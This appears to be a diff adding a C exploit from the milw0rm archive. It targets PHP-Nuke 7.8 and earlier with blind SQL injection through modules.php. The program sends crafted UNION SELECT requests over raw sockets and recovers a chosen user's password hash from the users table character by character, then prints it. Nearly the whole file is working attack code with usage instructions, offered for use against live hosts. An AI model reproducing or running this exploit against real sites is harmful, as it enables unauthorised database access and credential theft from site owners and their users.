@@ -1,0 +1,133 @@
+/***********************************************
+* PHP-Nuke <=7.8 SQL injection exploit
+* need MySQL > 4.0
+* (c)oded by 1dt.w0lf
+* RST/GHC
+* http://rst.void.ru
+* http://ghc.ru
+************************************************/
+// tested on 7.8
+
+#include <stdio.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <regex.h>
+
+#define START 47
+#define END   103
+#define SZ    1024
+#define PORT  80
+#define PREFIX "nuke_"
+#define SQL "name=PHP-Nuke%%207.8%%20Exploit'%%20UNION%%20SELECT%%201,1%%20FROM%%20%susers%%20WHERE%%20user_id=%d%%20AND%%20ascii(substring(user_password,%d,1))%c%d/*"
+
+
+main (int argc, char **argv) {
+ int pos;
+ int res = 0;
+ char result[33];
+	
+ if(argc<4)
+  {
+  printf("Usage %s [host] [/folder/] [user_id]\n",argv[0]);
+  exit(1);
+  }
+ 
+ printf("PHP-Nuke <= 7.8 SQL injection exploit\n"
+         "-------------------------------------\n"
+         "[~] Host : %s\n[~] Folder: %s\n"
+         "[!] Searching password for user with id : %d\n"
+         "[!] Please wait...\n",argv[1],argv[2],atoi(argv[3]));  
+ for(pos=1;pos<33;pos++)
+  {	 
+  found(argv[1],argv[2],atoi(argv[3]),START,END,pos,&res);  
+  sprintf(result+pos-1,"%c",res);
+  if(res == 0) { break; }
+  }
+ result[33] = '\0';
+ if(strlen(result)>0) printf("[+] Password: %s\n",result);
+ else printf("[-] Password not found\n");
+ exit (0);
+}
+
+int found(char * host, char * folder, int user_id, int min, int max, int pos, int * res)
+ {
+ int i;
+ int sr = (max - ((max-min)/2));
+ if( (max-min) < 6 ) { i=(brute(host,folder,user_id,min,max,pos)); *res = i; }
+ else if( (check(host,folder,pos,'>',sr,user_id)) == 1 ) { found(host,folder,user_id,sr,max,pos,res); }
+ else { found(host,folder,user_id,min,sr,pos,res);	} 
+ return 0;
+ }
+
+int brute(char * host, char * folder, int user_id, int min, int max, int pos)
+ {	 
+ int i;
+ for(i=min-1;i<max+1;i++)
+  {
+  if((check(host,folder,pos,'=',i, user_id)) == 1) { return i; }
+  }
+ return 0;  
+ }	 
+ 
+int check(char * host, char * folder, int pos, int chk, int test, int user_id)
+ {
+ char req[SZ]; 
+ char ans[SZ];
+ char sql[SZ];
+ int sock;
+ struct hostent *hp;
+ struct sockaddr_in sin;
+ regex_t re;
+ char *pattern = "Sorry, this Module isn't active!";
+ 
+ if( (sock = socket (AF_INET, SOCK_STREAM, 0)) < 0 )
+  {
+   printf("[ ERROR ] Can't create socket!\n");
+   exit(1);
+  } 
+  
+ if( (regcomp( &re, pattern, REG_EXTENDED )) != 0 )
+  {
+  printf("[ ERROR ] REG ERROR!\n");
+  exit(1);
+  }
+  
+ bzero(&sin, sizeof(sin));
+ sin.sin_family = AF_INET;
+ sin.sin_port   = htons(PORT);
+ hp = gethostbyname (host);
+  
+ memcpy ((char *)&sin.sin_addr,hp->h_addr,hp->h_length);
+ connect (sock, (struct sockaddr *)&sin, sizeof(sin)); 
+  
+ bzero(req,sizeof(req));
+ bzero(ans,sizeof(ans));
+ bzero(sql,sizeof(sql));	 
+	 
+ snprintf(sql,SZ-1,SQL,PREFIX,user_id,pos,chk,test);	 
+ 
+ snprintf(req,SZ-1,"POST %smodules.php HTTP/1.0\n"
+                  "Host: %s\n"
+                  "Content-Type: application/x-www-form-urlencoded\n"
+                  "Content-Length: %d\n\n"
+                  "%s\n\n\n",
+                  folder,
+				  host,
+                  strlen(sql),
+                  sql);
+ 
+ write(sock, req, strlen(req));
+
+ while( (read(sock, &ans, SZ-1)) > 0 )
+  {
+  if( (regexec( &re, ans, 0, NULL, 0)) == 0) { return 0; }
+  bzero(ans,sizeof(ans));
+  } 
+ close (sock); 
+ return 1;	 
+ }
+
+// milw0rm.com [2005-09-16]
